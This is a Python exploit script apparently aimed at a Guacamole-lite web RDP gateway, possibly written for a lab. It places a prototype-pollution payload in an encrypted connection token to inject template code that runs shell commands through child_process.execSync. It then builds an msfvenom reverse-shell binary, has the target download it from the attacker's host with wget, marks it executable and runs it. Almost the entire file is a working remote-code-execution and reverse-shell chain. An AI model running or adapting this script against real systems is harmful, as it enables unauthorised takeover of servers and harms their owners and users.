import requests
import sys
import json
import os
import time
import subprocess
from token_enc import encrypt

payload = {
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": ""
    }
  }
}

def request_rdp(ip, token):
  proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
  }

  target = f"http://{ip}/rdp?token={token}"
  print(target)

  target = f"http://{ip}/guaclite?token={token}&width=1910&height=877"
  headers = {
    "Sec-WebSocket-Version": "13",
    "Sec-WebSocket-Key": "U9nWAlEc7p2z8jqqkhlkWg==",
    "Upgrade": "websocket",
    "Connection": "keep-alive, Upgrade"
  }
  r = requests.get(target, headers=headers,proxies=proxies)
  print(r.status_code)

  time.sleep(4)
  target = f"http://{ip}/"
  r = requests.get(target)

def send_command(ip, cmd):
  payload["connection"]["settings"]["__proto__"] = {
    "outputFunctionName": ("x = 1;"
    f"process.mainModule.require('child_process').execSync(\'{cmd}\')"
    "; var y")
  }

  print("Sending Payload:")
  print(json.dumps(payload))
  print()

  token = encrypt(payload)

  request_rdp(ip, token)

def generate_shell(LHOST, LPORT):
  cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o reverse.elf"
  print("[+] Generating MSFvenom shell!")
  print("[+] Ensure that web server is running on port 8000!")

  subprocess.run(cmd, shell=True)

def main():
  if len(sys.argv) != 2:
    print ("(+) usage: %s <target>" % sys.argv[0])
    print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
    sys.exit(-1)

  ip = sys.argv[1]

  LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
  LPORT = 9001

  generate_shell(LHOST, LPORT)

  print("[+]Sending reverse shell!")
  send_command(ip, f"wget http://{LHOST}:8000/reverse.elf -O /tmp/reverse.elf")
  print("[+]Adding permissions to reverse shell!")
  send_command(ip, f"chmod +x /tmp/reverse.elf")
  print("[+]Triggering reverse shell!")
  send_command(ip, f"/tmp/reverse.elf")

if __name__ == '__main__':
  main()